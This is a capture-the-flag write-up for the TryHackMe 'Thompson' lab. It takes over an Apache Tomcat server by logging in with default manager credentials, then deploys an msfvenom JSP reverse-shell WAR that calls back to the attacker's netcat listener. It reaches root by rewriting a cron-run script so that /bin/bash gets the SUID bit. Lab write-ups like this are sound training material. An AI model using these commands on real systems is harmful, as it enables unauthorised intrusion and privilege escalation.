# TryHackMe
------------------------------------
### IP: 10.10.97.171
### Name: Thompson
### Difficulty: Easy
--------------------------------------------

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the --min-rate 10000 flag to speed things up. I'll also use the -sC and -sV to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/THM/Thompson]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV  10.10.97.171
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-13 08:10 CDT
Nmap scan report for 10.10.97.171
Host is up (0.21s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc052481987eb8db0592a6e78eb02111 (RSA)
|   256 60c840abb009843d46646113fabc1fbe (ECDSA)
|_  256 b5527e9c019b980c73592035ee23f1a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-title: Apache Tomcat/8.5.5
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.48 seconds
```

Looking at the page on port 8080 we find an Apache Tomcat 8.5.5 page

thompson_site.png

Using Feroxbuster we disciver the `/manager` endpoint:

thompson_dirs.png

This prompts a login:

thompson_login.png

And luckily for us we can use the default Tomcat credentials `tomcat:s3cret` to login:

thompson_in.png

From here we should be able to upload a malicious `.war` file to spawn a reverse shell.

### Exploitation

We can create the file using msfvenom:

```
┌──(ryan㉿kali)-[~/THM/Thompson]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.2.0.125 LPORT=443 -f war > shell.war
Payload size: 1095 bytes
Final size of war file: 1095 bytes
```

We can upload and then deploy it, and view it on the site:

thompson_shell_file.png

Setting up a netcat listener we catch our shell when the file is clicked on:

```
┌──(ryan㉿kali)-[~/THM/Thompson]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.2.0.125] from (UNKNOWN) [10.10.97.171] 37876
whoami
tomcat
hostname
ubuntu
python -c 'import pty;pty.spawn("/bin/bash")'

tomcat@ubuntu:/$ 
```

We can then grab the user.txt flag in Jack's home directory:

thompson_user_flag.png

### Privilege Escalation

Looking at the other files in Jack's directory, we see an id.sh bash script, and it's output of test.txt.

thompson_files.png

id.sh is simply running the `id` command and saving it to test.txt. Looking at test.txt we can see the user issuing the `id` command is root.

Also worth noting, is the fact that id.sh has fully open permissions, meaning we can write to it.

We can confirm that id.sh is being run every minute by root as a cronjob by using `cat /etc/crontab`:

```
tomcat@ubuntu:/home/jack$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	root	cd /home/jack && bash id.sh
```

Lets change the id.sh script to set the SUID bit on bash, which will be executed by root, and then drop into a root shell ourselves:

```
tomcat@ubuntu:/home/jack$ echo '/bin/chmod 4755 /bin/bash' > id.sh
tomcat@ubuntu:/home/jack$ cat id.sh
/bin/chmod 4755 /bin/bash
```

We can then wait one minute and run `/bin/bash -p` and we will drop into a root shell:

```
tomcat@ubuntu:/home/jack$ /bin/bash -p
bash-4.3# whoami
root
bash-4.3# id
uid=1001(tomcat) gid=1001(tomcat) euid=0(root) groups=1001(tomcat)
```

From here we can grab the final flag:

thompson_root_flag.png

Thanks for following along!

-Ryan

-------------------------------------------------